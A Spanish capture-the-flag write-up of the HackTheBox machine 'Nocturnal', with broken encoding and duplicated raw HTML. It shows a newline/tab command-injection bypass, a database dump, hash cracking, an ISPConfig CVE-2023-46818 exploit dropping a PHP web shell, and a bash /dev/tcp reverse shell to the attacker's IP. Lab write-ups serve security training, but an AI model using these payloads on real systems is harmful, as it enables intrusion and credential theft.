‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 1 ‚îÇ \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; 2 ‚îÇ \u0026lt;office:document-content xmlns:css3t=\u0026#34; ...SNIP ...\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;Dear \u0026lt;text:span text:style-name=\u0026#34;T1\u0026#34;\u0026gt;Amanda\u0026lt;/text:span\u0026gt;,\u0026lt;/t ‚îÇ ext:p\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of ‚îÇ your account and our infrastructure.\u0026lt;/text:p\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;The file has been created and provided by Nocturnal\u0026amp;apos;s IT team. If you have any questions or need additional assistance during the password change process, please do ‚îÇ not hesitate to contact us.\u0026lt;/text:p\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.\u0026lt; ‚îÇ /text:p\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;/\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;Yours sincerely,\u0026lt;/text:p\u0026gt;\u0026lt;text:p text:style-name=\u0026#34;P1\u0026#34;\u0026gt;Nocturnal\u0026amp;apos;s IT team\u0026lt;/text:p\u0026gt;\u0026lt;/office:text\u0026gt;\u0026lt;/office:body\u0026gt;\u0026lt;/office:document-content\u0026gt; Provamos a iniciar sesi√≥n con su usuario y la contrase√±a y accedemos al usuario amanda. Lo interesante es que posiblemente amanda sea una administradora de la aplicaci√≥n web ya que en su usuario nos muestra el panel de administrador:\nAcceso Inicial Investigando en el c√≥digo sobre la estructura del admin panel he encontrado una posible base de datos de la que coger credenciales para acceder a la m√°quina victima:\n#Base de datos archivo dashboard.php $db = new SQLite3(\u0026#39;../nocturnal_database/nocturnal_database.db\u0026#39;); Y tambi√©n vemos que tenemos una funci√≥n en el panel del admin para crear una backup del contenido existente, mirando el c√≥digo he visto la posibilidad de una inyecci√≥n de comandos.\n#Tenemos una funci√≥n que bloquea la entrada de ciertos car√°cteres especiales y si se detecta devuelve un false function cleanEntry($entry) { $blacklist_chars = [\u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39;]; foreach ($blacklist_chars as $char) { if (strpos($entry, $char) !== false) { return false; // Malicious input detected } } #En el caso de que la funci√≥n devuelva un false, $password ser√° igual a false y nos saldr√° un mensaje de error if (isset($_POST[\u0026#39;backup\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) { $password = cleanEntry($_POST[\u0026#39;password\u0026#39;]); $backupFile = \u0026#34;backups/backup_\u0026#34; . date(\u0026#39;Y-m-d\u0026#39;) . \u0026#34;.zip\u0026#34;; if ($password === false) { echo \u0026#34;\u0026lt;div class=\u0026#39;error-message\u0026#39;\u0026gt;Error: Try another password.\u0026lt;/div\u0026gt;\u0026#34;; #Pero en el caso de que consigamos hacerle un bypass a la funci√≥n, tendremos un posible RCE. Ya que nos guarda el payload en $command. $command = \u0026#34;zip -x \u0026#39;./backups/*\u0026#39; -r -P \u0026#34; . $password . \u0026#34; \u0026#34; . $backupFile . \u0026#34; . \u0026gt; \u0026#34; . $logFile . \u0026#34; 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;; #Que luego es ejecutado con proc_open: $process = proc_open($command, $descriptor_spec, $pipes); if (is_resource($process)) { proc_close($process); } Pruebo a usar el siguiente payload capturando la petici√≥n con burpsuit para hacerle el bypass al c√≥digo:\npassword=%0Abash%09-c%09\u0026#34;whoami\u0026#34;%0A\u0026amp;backup= www-data Al parecer usando %0A (salto de linia) para separar lo que ser√≠a el comando zip y ejecutar una bash funciona y usando %09 (tab) para usarlo como espacio nos permite hacerle un bypass a los fitros.\nAnteriormente hab√≠amos visto que tenia una base de datos y que usaba sqlite3, entonces ahora vamos a intentar dumpearnos la base de datos:\npassword=%0Abash%09-c%09\u0026#34;sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump%09\u0026gt;%09/tmp/tst.txt\u0026#34;%0A\u0026amp;backup= Una vez hemos obtenido los hashes de la base de datos le hacemos un ataque por fuerza bruta para romperlos. Una vez finalizado el ataque hemos podido obtener la contrase√±a del usuario tobias.\n‚ùØ hashcat -m 0 datos /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.2.6) starting ...SNIP... 55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse Approaching final keyspace - workload adjusted. ‚ùØ ssh tobias@10.10.11.64 The authenticity of host \u0026#39;10.10.11.64 (10.10.11.64)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.64\u0026#39; (ED25519) to the list of known hosts. tobias@10.10.11.64\u0026#39;s password: ...SNIP... tobias@nocturnal:~$ cat user.txt e3d59*************************** Escalada de privilegios Una vez que estamos dentro de la m√°quina host empezamos a hacer enumeraci√≥n del sistema.\nRevisamos los permisos de sudoers, los permisos SUID y al revisar los servicios internos vemos que tiene un servicio corriendo en el puerto 8080.\ntobias@nocturnal:~$ sudo -l [sudo] password for tobias: Sorry, user tobias may not run sudo on nocturnal. tobias@nocturnal:~$ id uid=1000(tobias) gid=1000(tobias) groups=1000(tobias) tobias@nocturnal:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/bin/passwd /usr/bin/mount /usr/bin/chfn /usr/bin/su /usr/bin/chsh /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/at /usr/bin/fusermount /usr/bin/sudo /usr/bin/umount /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign tobias@nocturnal:~$ netstat -ano | grep LISTEN tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN off (0.00/0/0) tcp 0 0 127.0.0.1:587 0.0.0.0:* LISTEN off (0.00/0/0) tcp6 0 0 :::22 :::* LISTEN off (0.00/0/0) Con lo cual vamos a aplicar port forwarding via ssh para abrirnos un t√∫nel entre la m√°quina victima y la m√°quina atacante y revisar desde nuestra m√°quina la p√°gina web.\n#Aqu√≠ lo que estamos haciendo es Local Port Forwarding, es decir, redirigimos el puerto local de una m√°quina a nuestro puerto remoto. ‚ùØ ssh tobias@10.10.11.64 -L 8080:127.0.0.1:8080 Ahora abrimos el navegador y vemos que tenemos en el puerto 8080 en localhost, en el encontramos una aplicaci√≥n web con un panel de identificaci√≥n:\nPruebo las credenciales de tobias pero me da un error ya que al parecer no son correctas para este panel. Entonces me pongo a buscar un posible leak de informaci√≥n o alguna pista para conseguir acceso a index.php en la carpeta /var.\nRevisando la carpeta de logs en /var/log me encuentro con una carpeta llamada ispconfig que dentro contiene un auth.log. Y ah√≠ veo que hay un login succesful con el usuario \u0026ldquo;admin\u0026rdquo;.\ntobias@nocturnal:/var/log/ispconfig$ ls -l total 4 -rw-r--r-- 1 root root 301 May 4 08:49 auth.log tobias@nocturnal:/var/log/ispconfig$ cat auth.log Successful login for user \u0026#39;admin\u0026#39; from 127.0.0.1 at 2025-04-09 10:19:13 with session ID vo10b400dv579klascjkkf1568 Successful login for user \u0026#39;admin\u0026#39; from 127.0.0.1 at 2025-04-09 10:54:48 with session ID k6cfshre0jfnp81hetdrc1c67a Failed login for user \u0026#39;tobias\u0026#39; from 127.0.0.1 at 2025-05-04 08:49:39 Entonces voy al panel pruebo a poner como usuario a admin y uso la contrase√±a de tobias, y consigo acceso al index.php\nEnumerando la pagina index.php encontramos la versi√≥n de ISPConfig y con una r√°pida b√∫squeda en google encontramos la vulnerabilidad disponible.\nCVE-2023-46818 - ISPConfig Exploit - PHP Code Injection https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-46818\nEn las versiones iguales o menores a la 3.2.11 se ha encontrado una vulnerabilidad que te permite inyectar c√≥digo PHP autentificado en el endpoint /admin/language_edit.php que puede llevar a un RCE. Esto ocurre debido al uso de un input mal sanitizado en el archivo de lenguage usado para generar c√≥digo PHP din√°mico.\nPara llevar a cabo la explotaci√≥n he usado este POC hecho en bash encontrado en github:\nhttps://github.com/rvizx/CVE-2023-46818\nAunque yo le he cambiado una parte del c√≥digo que usaba el comando (jq) para codificar cadenas en formato URL. Ya que yo no tenia instalado jq en mi m√°quina.\n#Soluciones posibles si no tienes jq instalado en el sistema: sudo pacman -S jq # O cambiar esta herramienta y usar python3 para codificar la cadena URL. ENCODED_INJECT=$(printf \u0026#39;%s\u0026#39; \u0026#34;$INJECT\u0026#34; | jq -s -R -r @uri) ENCODED_INJECT=$(python3 -c \u0026#34;import urllib.parse; print(urllib.parse.quote(input()))\u0026#34; \u0026lt;\u0026lt;\u0026lt; \u0026#34;$INJECT\u0026#34;) Instalar jq es la opci√≥n m√°s r√°pida y que deja el c√≥digo m√°s limpio, pero es una opci√≥n que podemos usar en el caso de no tener el comando jq.\nUna vez hecho esto he tirado ha ejecutar el payload pero me daba el siguiente error:\n[+] shell has been deployed to: http://127.0.0.1:8080/admin/sh.php [*] starting interactive shell. type \u0026#39;exit\u0026#39; to quit. ./exploit.sh: line 87: syntax error: unexpected end of file Esto pasa porque el c√≥digo del POC usa un bucle while para llevar a cabo el RCE y encontramos un peque√±o error de sintaxis en el c√≥digo, al acabar el while no lo cierra con un \u0026ldquo;done\u0026rdquo;.\nSimplemente arreglamos ese peque√±o error y ya podemos ejecutar el payload:\n‚ùØ ./exploit.sh http://127.0.0.1:8080/ admin slowmotionapocalypse [*] normalizing url... [*] cleaning previous session and preparing temp files... [*] logging in as user: \u0026#39;admin\u0026#39; [+] login successful [*] random language file to trigger injection: lrozzfcq.lng [*] sending language edit request to fetch CSRF tokens... [+] csrf_id = language_edit_1334ce81ef75ee918845260e [+] csrf_key = c9be0d447f361849295ece6494c70b7e0039e442 [*] building php web shell payload using base64 encoding with ____ markers [*] base64 payload: PD9waHAgcHJpbnQoJ19fX18nKTsgcGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9DJ10pKTsgcHJpbnQoJ19fX18nKTsgPz4= [*] sending injection payload using POST to language_edit.php [+] shell has been deployed to: http://127.0.0.1:8080/admin/sh.php [*] starting interactive shell. type \u0026#39;exit\u0026#39; to quit. ispconfig-shell# whoami root Ya hemos conseguido la shell como root pero la forma de trabajar aqu√≠ es incomoda con lo cual preparo una reverse shell y me abro el puerto en escucha en otra terminal:\nispconfig-shell# bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/1234 0\u0026gt;\u0026amp;1\u0026#39; [!] no output detected, raw response below: ________ #En el listener: ‚ùØ nc -lvnp 1234 Connection from 10.10.11.64:42138 bash: cannot set terminal process group (844): Inappropriate ioctl for device bash: no job control in this shell root@nocturnal:/usr/local/ispconfig/interface/web/admin# cd cd root@nocturnal:~# cat root.txt cat root.txt dc1a9*************************** ","permalink":"https://borhuub.github.io/writeups/nocturnal/","summary":"\u003cp\u003e\u003cimg alt=\"Nocturnal_Machine\" loading=\"lazy\" src=\"/img/nocturnal/nocturnal_machine.png\"\u003e\u003c/p\u003e\n\u003ch1 id=\"reconocimiento\"\u003eReconocimiento\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚Äã‚ùØ sudo nmap -p- --open -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.64 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-04-16 21:38 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 21:38\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.64 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 80/tcp on 10.10.11.64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 22/tcp on 10.10.11.64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 80/tcp on 10.10.11.64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 22/tcp on 10.10.11.64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 21:39, 13.97s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.047s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-04-16 21:38:54 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 14s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65327\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003ereset\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"m\"\u003e206\u003c/span\u003e filtered tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003eno-response\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh     syn-ack ttl \u003cspan class=\"m\"\u003e63\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    syn-ack ttl \u003cspan class=\"m\"\u003e63\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 14.04 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           Raw packets sent: \u003cspan class=\"m\"\u003e78164\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e3.439MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e69986\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e2.800MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ ports.py ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eüîç Puertos encontrados:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ‚ûú  \u003cspan class=\"m\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e¬°Puertos copiados en el portapapeles!\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-04-16 21:36 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e nocturnal.htb \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.11.64\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.14s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e3072\u003c/span\u003e 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 \u003cspan class=\"o\"\u003e(\u003c/span\u003eRSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    nginx 1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: nginx/1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Welcome to Nocturnal\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-cookie-flags:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   /:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     PHPSESSID:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_      httponly flag not \u003cspan class=\"nb\"\u003eset\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 9.68 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"enumeraci√≥n-web\"\u003eEnumeraci√≥n web\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ whatweb nocturnal.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://nocturnal.htb \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e200\u003c/span\u003e OK\u003cspan class=\"o\"\u003e]\u003c/span\u003e Cookies\u003cspan class=\"o\"\u003e[\u003c/span\u003ePHPSESSID\u003cspan class=\"o\"\u003e]\u003c/span\u003e, Country\u003cspan class=\"o\"\u003e[\u003c/span\u003eRESERVED\u003cspan class=\"o\"\u003e][\u003c/span\u003eZZ\u003cspan class=\"o\"\u003e]\u003c/span\u003e, Email\u003cspan class=\"o\"\u003e[\u003c/span\u003esupport@nocturnal.htb\u003cspan class=\"o\"\u003e]\u003c/span\u003e, HTML5, HTTPServer\u003cspan class=\"o\"\u003e[\u003c/span\u003eUbuntu Linux\u003cspan class=\"o\"\u003e][\u003c/span\u003enginx/1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)]\u003c/span\u003e, IP\u003cspan class=\"o\"\u003e[\u003c/span\u003e10.10.11.64\u003cspan class=\"o\"\u003e]\u003c/span\u003e, Title\u003cspan class=\"o\"\u003e[\u003c/span\u003eWelcome to Nocturnal\u003cspan class=\"o\"\u003e]\u003c/span\u003e, nginx\u003cspan class=\"o\"\u003e[\u003c/span\u003e1.18.0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t \u003cspan class=\"m\"\u003e200\u003c/span\u003e -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e===============================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGobuster v3.6\n\u003c/span\u003e\u003c/span\u003e\u003cspan 